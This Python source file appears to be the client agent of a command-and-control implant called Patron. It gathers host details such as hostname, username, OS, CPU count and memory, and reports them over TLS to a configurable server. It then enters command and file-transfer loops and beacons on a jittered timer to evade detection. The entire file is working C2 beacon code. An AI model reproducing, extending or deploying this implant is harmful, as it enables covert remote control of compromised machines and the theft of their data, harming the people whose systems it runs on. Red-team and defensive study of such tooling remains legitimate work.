import socket
import ssl
import time
import uuid
import platform
import os
import ipaddress
import getpass
import argparse
import logging
import psutil
from datetime import datetime
from command import handle_command_loop
from file import handle_file_request
import patronobuf as pb
from common import write_delimited, read_delimited

SERVER_IP = os.environ.get("SERVER_IP", "127.0.0.1")
SERVER_PORT = int(os.environ.get("SERVER_PORT", 9000))
CALLBACK_FREQ = int(os.environ.get("CALLBACK_FREQ", 30))
CALLBACK_JITTER = int(os.environ.get("CALLBACK_JITTER", 20))
ROOT_CERT_PATH = "certs/root.crt"

logger = logging.getLogger("patron_client")

def init_logging(debug=False):
    level = logging.DEBUG if debug else logging.WARNING
    logging.basicConfig(
        level=level,
        format="[%(asctime)s] [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )

def get_metadata():
    return {
        "uuid": str(uuid.uuid4()),
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "ostype": platform.system(),
        "arch": platform.machine(),
        "osbuild": f"{platform.system().lower()} {platform.release()}",
        "cpus": str(os.cpu_count()),
        "memory": str(get_memory())
    }

def get_memory():
    try:
        mem_gb = psutil.virtual_memory().total / (1024**3)
        return f"{mem_gb:.1f}"
    except ImportError:
        return "unknown"

def calculate_next_callback(freq, jitter):
    import random
    base = freq
    variance = base * (jitter / 100.0) * random.random()
    return base - (base * (jitter / 100.0)) + 2 * variance

def connect_tls(server_ip, server_port, root_cert):
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=root_cert)
    context.check_hostname = False

    try:
        ip_obj = ipaddress.ip_address(server_ip)
        family = socket.AF_INET6 if ip_obj.version == 6 else socket.AF_INET
    except ValueError:
        family = socket.AF_UNSPEC

    sock = socket.socket(family, socket.SOCK_STREAM)
    conn = context.wrap_socket(sock, server_hostname=server_ip)
    conn.connect((server_ip, int(server_port)))
    return conn

def send_config(conn, meta, agentip):
    req = pb.Request(
        type=pb.CONFIGURATION,
        configuration=pb.ConfigurationRequest(
            uuid=meta["uuid"],
            username=meta["username"],
            hostname=meta["hostname"],
            ostype=meta["ostype"],
            arch=meta["arch"],
            osbuild=meta["osbuild"],
            cpus=meta["cpus"],
            memory=meta["memory"],
            agentip=agentip,
            serverip=SERVER_IP,
            serverport=str(SERVER_PORT),
            callbackfrequency=str(CALLBACK_FREQ),
            callbackjitter=str(CALLBACK_JITTER),
            masterkey="MASTERKEY",
            nextcallback_unix=int(time.time() + 30),
        )
    )

    logger.debug("Sending configuration request...")
    try:
        write_delimited(conn, req)
        logger.debug("Sent configuration request")
    except Exception as e:
        logger.error(f"Failed to send configuration request: {e}")
        return None

    try:
        resp = read_delimited(conn, pb.Response)
        logger.debug(f"Raw response type value: {resp.type}")
        logger.debug(f"WhichOneof(payload): {resp.WhichOneof('payload')}")
        logger.debug(f"Full response: {resp}")

        if resp.type == pb.CONFIGURATION_RESPONSE and resp.HasField("configuration_response"):
            return resp.configuration_response
        else:
            logger.warning("Did not receive valid configuration_response payload")
            return None
    except Exception as e:
        logger.error(f"Exception while reading configuration response: {e}")
        return None

def main(debug=False):
    init_logging(debug)
    meta = get_metadata()

    while True:
        try:
            conn = connect_tls(SERVER_IP, SERVER_PORT, ROOT_CERT_PATH)
            logger.info("Connected to server")

            local_ip = conn.getsockname()[0]
            logger.debug(f"Local IP used: {local_ip}")

            response = send_config(conn, meta, local_ip)
            if response:
                logger.info(f"Received configuration: {response}")
            else:
                logger.warning("No config response received")
            handle_command_loop(conn, meta["uuid"])
            handle_file_request(conn, meta["uuid"])

            conn.close()
            logger.debug("Closed connection")
        except Exception as e:
            logger.error(f"Error: {e}")

        sleep_time = calculate_next_callback(CALLBACK_FREQ, CALLBACK_JITTER)
        logger.info(f"Sleeping for {int(sleep_time)}s")
        time.sleep(sleep_time)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    args = parser.parse_args()
    main(debug=args.debug)
